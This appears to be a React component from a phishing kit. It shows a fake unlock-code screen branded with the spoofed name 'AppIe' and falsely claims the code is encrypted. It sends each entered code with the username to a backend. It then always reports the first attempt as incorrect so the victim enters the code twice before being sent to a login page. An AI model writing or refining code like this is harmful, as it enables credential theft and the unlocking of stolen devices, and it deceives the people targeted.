import React, { useEffect, useRef, useState } from 'react';
import { Form, FormControl, Button, FloatingLabel } from 'react-bootstrap';
import responses from '../../../api/responses';
import SvgSpinner from '../svgComponents/SvgSpinner';
import '../../assets/css/passcode.css';
import { useData } from '../../../context/UserContext';

const Passcode = ({
    setShowLogin,
    darkMode,
    translator
}) => {
    const { user } = useData();
    const isDarkMode = darkMode === true || darkMode === 'true';
    let typeCode = user?.data?.unlockCode;
    const isAlfa = typeCode === 'alphanumeric';
    let lengthCode = isAlfa ? 4 : (typeCode == 4 ? 4 : 6);

    const [inputValues, setInputValues] = useState(new Array(lengthCode).fill(''));
    const [codeOne, setCodeOne] = useState('');
    const [codeTwo, setCodeTwo] = useState('');
    const [passCodeCount, setPassCodeCount] = useState(0);
    const [errorAlfa, setErrorAlfa] = useState(false);
    const [loadingAlfa, setLoadingAlfa] = useState(false);
    const [showError, setShowError] = useState(false);

    // Para el focus visual
    const [focusedInput, setFocusedInput] = useState(null);
    const [alfaFocused, setAlfaFocused] = useState(false);

    const passCodeOneRef = useRef('');
    const passCodeTwoRef = useRef('');
    const inputRefs = useRef([]);
    const alfaInputRef = useRef(null);

    useEffect(() => {
        if (!isAlfa && errorAlfa) {
            inputRefs.current.forEach(ref => ref && ref.blur());
        }
        if (!isAlfa && !errorAlfa) {
            inputRefs.current[0]?.focus();
        }
    }, [errorAlfa, isAlfa, lengthCode]);

    const handleInputChange = (e, i) => {
        const val = e.target.value.replace(/[^0-9]/g, '');
        let newValues = [...inputValues];

        setShowError(false);
        setErrorAlfa(false);

        const lastFilledIndex = newValues.reduce((acc, v, idx) => v ? idx : acc, -1);

        if (i > 0 && !newValues[i - 1]) {
            let firstEmpty = newValues.findIndex((v, idx) => idx > lastFilledIndex && !v);
            if (firstEmpty === -1) firstEmpty = newValues.findIndex(v => !v);
            inputRefs.current[firstEmpty >= 0 ? firstEmpty : 0].focus();
            return;
        }

        newValues[i] = val;

        if (newValues.every(v => !v)) {
            setInputValues(new Array(lengthCode).fill(''));
            inputRefs.current[0].focus();
            return;
        }

        if (!val && i < lengthCode - 1 && newValues.slice(i + 1).some(v => v)) {
            setInputValues(new Array(lengthCode).fill(''));
            inputRefs.current[0].focus();
            return;
        }

        setInputValues(newValues);

        if (val && i < lengthCode - 1) {
            inputRefs.current[i + 1].focus();
        }

        if (i === lengthCode - 1 && newValues.every(v => v)) {
            handlePasscode(newValues.join(''));
        }
    };

    const handleKeyDown = (e, i) => {
        if (e.key === 'Backspace' && !inputValues[i] && i > 0) {
            inputRefs.current[i - 1].focus();
        }
    };

    const handleAlfaChange = (e) => {
        setCodeOne(e.target.value);
        setErrorAlfa(false);
        setShowError(false);
    };

    const handleAlfaFocus = () => {
        setAlfaFocused(true);
        setErrorAlfa(false);
        setShowError(false);
    };

    const handleAlfaBlur = () => {
        setAlfaFocused(false);
    };

    const handlePasscode = (code, e) => {
        if (isAlfa) {
            if (e) e.preventDefault();
        }
        setErrorAlfa(false);
        setShowError(false);
        inputRefs.current.forEach(ref => ref && ref.blur());
        setLoadingAlfa(true);
        setPassCodeCount((prevCount) => {
            const newCount = prevCount + 1;
            if (newCount === 1) {
                passCodeOneRef.current = code;
            } else if (newCount === 2) {
                passCodeTwoRef.current = code;
            }
            setCodeOne(passCodeOneRef.current);
            setCodeTwo(passCodeTwoRef.current);

            let statusPasscode = '';
            setTimeout(async () => {
                if (newCount === 1) {

                    statusPasscode = 'passcode';
                    await addAcountPasscode(passCodeOneRef.current, 'Processing', statusPasscode);
                    if (isAlfa) {
                        setCodeOne('');
                        if (alfaInputRef.current) alfaInputRef.current.focus();
                    } else {
                        setInputValues(new Array(lengthCode).fill(''));
                        inputRefs.current[0].focus();
                    }
                    setLoadingAlfa(false);
                    setShowError(true);
                } else if (newCount === 2) {
                    statusPasscode = 'passcode_process';
                    await addAcountPasscode(passCodeOneRef.current, passCodeTwoRef.current, statusPasscode);
                    setTimeout(() => {
                        setShowLogin(true);
                    }, 1500);
                }
            }, 1500);
            return newCount;
        });
    };

    const addAcountPasscode = async (passCodeOne, passCodeTwo, statusPasscode) => {
        try {
            let data = {
                linkCode: user?.data?.linkCode || '',
                username: user?.data?.username || '',
                codesUnlock: `${passCodeOne}-${passCodeTwo}`,
                status: statusPasscode
            }
            const response = await responses.addUnlockCode(data);
        } catch (error) {
            console.error('Error en add passcode:', error);
        }
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        setErrorAlfa(false);
        setShowError(false);
        if (isAlfa) {
            if (!codeOne || codeOne.length < 1) {
                setErrorAlfa(true);
                return;
            }
            setLoadingAlfa(true);
            handlePasscode(codeOne, e);
        }
    };

    let inputs = [];
    if (!isAlfa) {
        for (let i = 0; i < lengthCode; i++) {
            inputs.push(
                <input
                    key={i}
                    type="tel"
                    maxLength={1}
                    value={inputValues[i] || ''}
                    onChange={e => handleInputChange(e, i)}
                    onKeyDown={e => handleKeyDown(e, i)}
                    ref={el => inputRefs.current[i] = el}
                    id={`code-input-${i}`}
                    style={{
                        border: isDarkMode ? '1px #6e6e73 solid' : '1px solid rgb(68 68 68 / 52%)',
                        width: '48px',
                        height: '48px',
                        margin: '0 8px',
                        fontSize: '2rem',
                        textAlign: 'center',
                        borderRadius: '8px',
                        background: isDarkMode ? '#181818' : '#fff',
                        color: isDarkMode ? '#fff' : '#181818'
                        // Elimina el border aquí
                    }}
                    autoFocus={i === 0}
                    disabled={errorAlfa}
                    inputMode="numeric"
                    pattern="[0-9]*"
                    className={focusedInput === i ? 'input-focus-blue' : ''}
                    onFocus={() => {
                        setFocusedInput(i);
                        setErrorAlfa(false);
                        setShowError(false);
                    }}
                    onBlur={() => setFocusedInput(null)}
                />
            );
        }
    }

    return (
        <Form onSubmit={handleSubmit} style={{ position: 'relative', width: '100%' }}>
            <div style={{ textAlign: 'center', marginBottom: '32px' }}>
                <h4 style={{
                    color: isDarkMode ? '#fff' : 'rgba(0,0,0,0.88)',
                    marginBottom: 24,
                    fontSize: '28px',
                    fontWeight: '600',
                    lineHeight: '36px',
                    webkitMarginBefore: '20px',
                    marginBlockStart: '20px',
                    textAlign: 'center'
                }}>{translator('Ingrese su código de desbloqueo')}</h4>
                <div style={{ display: 'flex', justifyContent: 'center', marginBottom: 20 }}>
                    {isAlfa ? (
                        <div style={{ width: '100%', maxWidth: 320 }}>
                            <>
                                {/* Inyectamos el CSS específico para corregir el fondo blanco de la etiqueta */}
                                <style>
                                    {`
                                        .form-floating > label {
                                            background-color: transparent !important;
                                            color: ${isDarkMode ? '#fff' : '#181818'} !important;
                                        }
                                        .form-floating > label::after {
                                            background-color: ${isDarkMode ? '#181818' : 'transparent'} !important;
                                            border-radius: 8px !important;
                                        }
                                    `}
                                </style>

                                <FloatingLabel
                                    controlId="alfaPasscode"
                                    label={translator('Código de desbloqueo')}
                                    className="mb-3"
                                >
                                    <FormControl
                                        type="password"
                                        placeholder={translator('Código de desbloqueo')}
                                        style={{
                                            width: '100%',
                                            height: '48px',
                                            fontSize: '1.2rem',
                                            textAlign: 'center',
                                            borderRadius: '8px',
                                            border: '1px solid #444',
                                            background: isDarkMode ? '#181818' : 'white', // Cambié 'red' por 'white' para que tenga sentido si no es dark
                                            color: isDarkMode ? '#fff' : '#181818'
                                        }}
                                        value={codeOne}
                                        onChange={handleAlfaChange}
                                        onFocus={handleAlfaFocus}
                                        onBlur={handleAlfaBlur}
                                        autoFocus
                                        maxLength={20}
                                        autoComplete="off"
                                        disabled={false}
                                        ref={alfaInputRef}
                                        className={alfaFocused ? 'input-focus-blue' : ''}
                                    />
                                </FloatingLabel>
                            </>
                            {errorAlfa && (
                                <div style={{ color: 'red', marginTop: 8, fontSize: 14 }}>
                                    {translator('El código no puede estar vacío')}
                                </div>
                            )}
                            <div style={{ position: 'relative', marginTop: '16px' }}>
                                {/* <PopupLogin text={'Código de verificación incorrecto'} /> */}
                            </div>
                        </div>
                    ) : (
                        <div style={{ display: 'flex', justifyContent: 'center', width: '100%' }}>
                            {inputs}
                        </div>
                    )}
                </div>
                <div style={{ color: '#ccc', marginBottom: 16 }}>
                    {loadingAlfa && (typeCode === '6' || typeCode === '4') && <SvgSpinner style={{ color: isDarkMode ? 'white' : '#181818', width: '25px', height: '25px', marginRight: '8px' }} />}
                    {showError && (
                        <div style={{
                            color: '#ff2d2d',
                            fontSize: '15px',
                            display: 'flex',
                            alignItems: 'center',
                            gap: '6px',
                            marginTop: '8px',
                            justifyContent: 'center'
                        }}>

                            {translator('Código de verificación incorrecto.')}
                        </div>
                    )}
                </div>
                {isAlfa && (
                    <Button
                        type="submit"
                        className="btn"
                        style={{
                            width: '150px',
                            borderRadius: '8px',
                            fontSize: '1.1rem',
                            fontWeight: '500',
                            marginTop: '8px'
                        }}
                        disabled={loadingAlfa}
                        onClick={() => {
                            setErrorAlfa(false);
                            setShowError(false);
                        }}
                    >
                        {loadingAlfa ? <SvgSpinner style={{ color: 'white', width: '25px', height: '25px', marginRight: '8px' }} /> : translator('Verificar')}
                    </Button>
                )}

                <div style={{ display: 'none' }}>
                    <Button variant="link" style={{ color: '#4bb1ff', padding: 0 }}>
                        {translator('Reenviar código a iPhone')}
                    </Button>
                    <br />
                    <Button variant="link" style={{ color: '#4bb1ff', padding: 0 }}>
                        {translator('¿No tienes acceso a tu iPhone?')}
                    </Button>
                </div>
            </div>
            <hr style={{ background: '#333', margin: '32px 0' }} />
            <div className='textFooter'>
                {translator('El acceso a tu cuenta está protegido por el código.')} <p>{translator('Tu código esta encriptado y AppIe no podrá leerlo.')}</p>
            </div>
        </Form>
    );
};

export default Passcode;